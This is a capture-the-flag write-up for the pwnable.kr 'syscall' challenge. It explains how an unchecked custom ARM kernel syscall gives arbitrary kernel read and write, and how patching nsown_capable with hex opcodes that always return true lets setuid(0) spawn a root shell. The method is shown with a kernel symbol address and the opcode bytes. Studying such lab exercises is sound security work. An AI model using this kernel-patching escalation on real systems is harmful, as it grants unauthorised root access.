# Syscall

Writeup for syscall challenge in pwnable.kr (200 points).

## Background

Syscall challenge is all about a syscall that someone added to the kernel that
we need to exploit. 

## Exploring the environment
When we log in with ssh to `syscall@pwnable.kr` in port 2222 
we are dropped into a VM,

`uname -a` will provide us more info about it:
```
/ $ uname -a
Linux (none) 3.11.4 #13 SMP Fri Jul 11 00:48:31 PDT 2014 armv7l GNU/Linux
```
- Architecture is `armv7l`, which is a 32 bit processor.
- Our kernel version is 3.11.4

When I logged in to this machine is was wondering how will I be able
to deliver my payload, and what flag should I read.

by running `find / -name flag` I've found the file `/root/flag`.

In order to deliver our binary payload we will encode it with base64 encoding,
and use `payload | base64 --decode > executable` to decode it.


## Exploring the syscall code

The given syscall is named `sys_upper` and its descriptor is 223.
What it does is very simple:
- Take 2 arguments: `char* in` and `char* out`.
- Puts transforms `in` to uppercase and stores it in `out`.

This is how it's implemented

```C
asmlinkage long sys_upper(char *in, char* out){
	int len = strlen(in);
	int i;
	for(i=0; i<len; i++){
		if(in[i]>=0x61 && in[i]<=0x7a){
			out[i] = in[i] - 0x20;
		}
		else{
			out[i] = in[i];
		}
	}
	return 0;
}
```

Complete source code is in syscall.c

### Vulnerability

The Vulnerability here is that the syscall does not use the conventional 
`copy_from_user` and `copy_to_user` functions when dealing with pointers 
from user mode.

These function ensure that the user has read/write permissions on the 
given pointers.

Since those funtions are not used, we are able to:
- **Read Kernel Memory**
- **Write Kernel Memory**


## Exploiting the vulnerability

We now have HUGE power. We can write and read from everywhere we want
in the operating system.

I assume there are many ways to pwn this machine, but I'll choose 
the one that seem the simplest to implement.

First thing I did was looking into the syscall table of arm architecture in kernel version 3.11:
https://github.com/torvalds/linux/blob/v3.11/arch/arm/kernel/calls.S


### Overriding the setuid syscall

setuid syscall lets the user set it's user identity from within the process.
This means a non-previleged user can change it's user id to 0 (== root), but'
of course, it is not possible for all processes.

This applies only to processes that has the capabilities to set uid.
For more information about capabilities, explore the `man capabilities` page.

In order to achieve the CAP_SETUID capability, the file on the filesystem needs
to have the suid bit turned on. 

BUT, what if we can patch the `sys_setuid` syscall to always allow the usage of 
setuid even if suid bit is off.


### Diving into the syscall implementation

sys_setuid syscall implementation for kernel 3.11:
https://github.com/torvalds/linux/blob/v3.11/kernel/sys.c (line 519)

The part we target inside the syscall is the if statement that checks if 
we have the CAP_SETUID capability.

Here it is: 

```C
SYSCALL_DEFINE1(setuid, uid_t, uid)
{
    // -- snip --
	if (nsown_capable(CAP_SETUID)) {
		new->suid = new->uid = kuid;
		if (!uid_eq(kuid, old->uid)) {
			retval = set_user(new);
			if (retval < 0)
				goto error;
		}
	} else if (!uid_eq(kuid, old->uid) && !uid_eq(kuid, new->suid)) {
		goto error;
	}

    // -- snip --
}
```

`nsown_capable` seems to check if the current process has the given capability.
Of course we can Confirm that by looking at the implementation of this function:
https://github.com/torvalds/linux/blob/v3.11/kernel/capability.c (line 436)

```C
/**
 * nsown_capable - Check superior capability to one's own user_ns
 * @cap: The capability in question
 *
 * Return true if the current task has the given superior capability
 * targeted at its own user namespace.
 */
bool nsown_capable(int cap)
{
	return ns_capable(current_user_ns(), cap);
}
```


What we can do is patch this function to always return **true**.
This will grant all user-mode processes all the capabilities :).

Once we have this method patched we can just run:
```C
setuid(0);
execv("/bin/bash", {"/bin/bash", NULL});
```

and get a shell as root.

## Crafting the payload

### Findind `nsown_capable` address

First we need to discover the address of `nsown_capable`.
For that we'll use the `/boot/System.map` file which maps kernel
symbols to addresses in memory.

```
/boot $ less System.map | grep nsown_capable
c00270f4 T nsown_capable
```

**Address is:** `0xc00270f4`

What we need to patch is nsown_capable:
https://github.com/torvalds/linux/blob/v3.11/kernel/capability.c (line 442)


### Patching the payload without learning ARM

In order to not waste my time on learning ARM, I decided to write a
C code that contains a function that always return `true` with the same signature as `nsown_capable`,

Function implementation is in `return_true.c`:

```C
bool is_capable(uid_t uid) {
    return true;
}
```

Here is how to cross-compile C Code to ARM:
https://askubuntu.com/questions/250696/how-to-cross-compile-for-arm


After compiling the return_true.c code, Let's find the disassembled
content of the `is_capable` function. I'll first find its address
by using `readelf` command:

```bash
$ readelf -a return_true | grep is_capable
  2762: 00010530    36 FUNC    GLOBAL DEFAULT    4 is_capable
```

Address is `0x00010530`. Now I'll disassemble the binary by running:
```bash
arm-linux-gnueabi-objdump --disassemble return_true | less
```

Searching for this address will give:


```
00010530 <is_capable>:
   10530:       e52db004        push    {fp}            ; (str fp, [sp, #-4]!)
   10534:       e28db000        add     fp, sp, #0
   10538:       e24dd00c        sub     sp, sp, #12
   1053c:       e50b0008        str     r0, [fp, #-8]
   10540:       e3a03001        mov     r3, #1
   10544:       e1a00003        mov     r0, r3
   10548:       e28bd000        add     sp, fp, #0
   1054c:       e49db004        pop     {fp}            ; (ldr fp, [sp], #4)
   10550:       e12fff1e        bx      lr
```

This is the disassembled ARM code behind the is_capable function.
Here it is translated to opcodes only:
```
e52db004e28db000e24dd00ce50b0008e3a03001e1a00003e28bd000e49db004e12fff1e
```


In order to patch the `nsown_capable` function we need to write this byte sequence
to the function's location.